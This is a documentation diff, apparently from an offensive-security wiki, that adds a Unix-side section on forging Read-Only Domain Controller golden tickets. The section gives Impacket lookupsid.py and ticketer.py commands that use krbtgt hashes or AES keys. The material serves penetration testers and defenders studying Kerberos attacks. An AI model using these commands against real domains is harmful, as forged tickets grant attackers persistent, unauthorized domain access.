@@ -18,7 +18,24 @@ With administrative access to an [RODC](../../builtins/rodc.md), it is possible 
 
 === UNIX-like
 
-_For the moment, no tool is available to only forge a RODC Golden Ticket from UNIX-like systems._
+> [!NOTE]
+> _At the time of writing, 15th Apr. 2026,_ [_the pull request_](https://github.com/fortra/impacket/pull/2169) _adding the `-rodcNo` is pending._
+
+There are [Impacket](https://github.com/fortra/impacket) scripts for each step of a golden ticket creation : retrieving the domain SID, creating the RODC golden ticket.
+
+```bash
+# Find the domain SID
+lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
+
+# Create the RODC golden ticket (with an RC4 key, i.e. NT hash)
+ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"
+
+# Create the RODC golden ticket (with an AES 128/256bits key)
+ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"
+
+# Create the RODC golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
+ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
+```
 
 
 === Windows
